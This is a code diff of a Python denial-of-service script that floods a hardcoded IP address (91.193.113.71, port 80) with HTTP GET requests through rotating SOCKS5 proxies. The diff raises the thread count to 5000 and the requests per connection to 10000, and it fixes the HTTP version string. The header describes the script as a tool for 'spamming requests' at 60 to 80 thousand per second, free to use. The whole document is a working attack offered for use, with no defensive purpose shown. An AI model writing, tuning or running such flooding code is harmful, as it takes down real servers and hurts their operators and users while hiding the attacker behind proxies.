@@ -1,5 +1,5 @@
-# at least 50mbit/s & 3 cores required
-# Tested on Intel I9 3 cores, 1Gbit (60 - 80kr/s) 
+# at least 50mbit/s & 3 cores required (60 - 80kr/s) 
+# Tested on Intel I9 3 cores, 1Gbit
 # Coded by Chandler free to use
 # This was made for testing & maxing out the performance of spamming requests
 
@@ -13,8 +13,8 @@ import random
 target = '91.193.113.71'
 port = 80
 
-rpc = 5000
-threads = 2000
+rpc = 10000
+threads = 5000
 
 def load_proxies(filename):
     with open(filename, 'r') as f:
@@ -31,7 +31,7 @@ def attack():
             s.set_proxy(socks.SOCKS5, proxy.split(':')[0], int(proxy.split(':')[1]))
             s.connect((target, port))
             for _ in range(rpc):
-                request = f"GET / HTTP/1.2\r\nHost: {target}\r\n\r\n"
+                request = f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
                 s.send(request.encode('ascii'))
             s.close()
         except Exception as e:
